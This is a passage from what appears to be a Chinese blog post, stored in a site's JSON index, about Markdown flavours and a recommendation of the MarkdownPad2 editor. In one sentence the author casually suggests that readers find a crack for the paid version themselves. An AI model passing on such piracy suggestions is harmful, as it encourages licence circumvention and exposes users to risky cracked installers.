Maruku等。这些衍生版本要么基于工具，如Pandoc；要么基于网站，如GitHub和Wikipedia，在语法上基本兼容，但在一些语法和渲染效果上有改动。 Markdown的编辑器推荐 在线版我就不多说了，像简书，马克印象都可以，但是很少用到，我一般使用本地版，个人推荐Markdownpad2，这个产品我感觉用着很舒服，但是需要注册购买，其实这个软件的free版本就足够了，pro版本有更高级的功能，交互性更好，想安装的话可以自己去找找破解方法。对了，安装之后还需要安装一个sdk，以解决html error的问题。想了解更多关于编辑器的可以看看这个：Markdown 编辑器推荐以上内容参考：Markdown 简单的世界","categories":[],"tags":[{"name":"编程随笔","slug":"编程随笔","permalink":"http://whosurdaddy.cf/tags/编程随笔/"}]}]}